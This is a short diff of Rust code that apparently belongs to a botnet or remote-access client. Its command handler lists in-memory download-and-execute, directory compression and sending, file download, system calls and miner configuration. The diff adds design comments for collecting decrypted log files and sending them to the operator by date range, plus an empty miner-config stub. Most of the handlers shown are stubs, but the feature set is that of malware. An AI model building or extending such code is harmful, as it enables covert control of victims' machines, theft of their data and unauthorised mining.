@@ -128,7 +128,18 @@ impl BotHandler {
                 }
             }
             receive::ClientAction::DownloadAndExecFileInMemory => {}
-            receive::ClientAction::FetchLogs => {}
+            receive::ClientAction::FetchLogs => {
+                // all the log folders - just read each file in them - store a map of filename - data
+
+                // load bytes - split by b"\r\n\r\n"
+                // decrypt each split, convert into parsed
+
+                // parsed will be - date, tag, content - ordered all strings
+                // then just send like 5 maps of that
+
+                // and the fetch params will simply be bools of which to get, and also timedate range of which to include
+
+            }
             receive::ClientAction::CompressDirAndSend => {}
             receive::ClientAction::CallSysEvent => {
                 if let ClientParams::CallSysEvent(params) = processed_data.params {
@@ -229,7 +240,9 @@ impl BotHandler {
                     );
                 }
             }
-            receive::ClientAction::UpdateMinerConfig => {}
+            receive::ClientAction::UpdateMinerConfig => {
+                //
+            }
             receive::ClientAction::DownloadFile => {
                 if let ClientParams::DownloadFile(params) = processed_data.params {
                     let path = PathBuf::from(params.abs_path);
